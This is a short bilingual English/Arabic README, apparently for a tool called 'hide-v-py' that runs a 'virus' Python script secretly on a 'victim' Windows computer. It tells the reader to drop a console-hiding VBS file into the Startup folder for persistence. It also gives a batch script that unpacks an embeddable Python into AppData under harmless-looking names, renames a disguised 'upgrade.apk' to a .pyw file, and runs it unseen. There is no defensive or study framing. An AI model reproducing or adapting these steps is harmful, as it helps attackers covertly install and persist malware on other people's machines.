# hide-v-py
## run virus python secretly \ تشغيل فيروس بايثون سرا
- You can use the software in more than one way \ تستطيع أستخدام البرمجية بأكثر من طريقة
- Download python Windows embeddable package (64-bit) / Windows embeddable package (64-bit) حمل بايثون 
## the victim / الضحية
> Note: put file no-console.vbs in `C:\Users\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` because this autostart Folder.


> ملحوظة:ضع ملف no-console.vbs في `C:\Users\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` لأن هذا المجلد لتشغيل تلقائي

## Example / مثال
```batch
cd C:\Users\see\AppData\Roaming\Microsoft\Windows
:: Windows-embeddable-package-python  in upgrade
IF EXIST "upgrade" (
cd C:\Users\see\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
:: change file python to original name
ren "upgrade.apk" "upgrade.pyw"
:: go to python.exe
cd "C:\Users\see\AppData\Roaming\Microsoft\Windows\upgrade"
:: run file python by python.exe
python.exe "C:\Users\see\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\upgrade.pyw"
) ELSE (
:: if Folder upgrade not unzip
ren "update" "update.zip"
:: unzip update.zip
powershell -Command "Expand-Archive update.zip -DestinationPath C:\Users\see\AppData\Roaming\Microsoft\Windows"
ren "update.zip" "update"
cd C:\Users\see\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
ren "upgrade.apk" "upgrade.pyw"
cd "C:\Users\see\AppData\Roaming\Microsoft\Windows\upgrade"
python.exe "C:\Users\see\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\upgrade.pyw"
)
exit 0
```
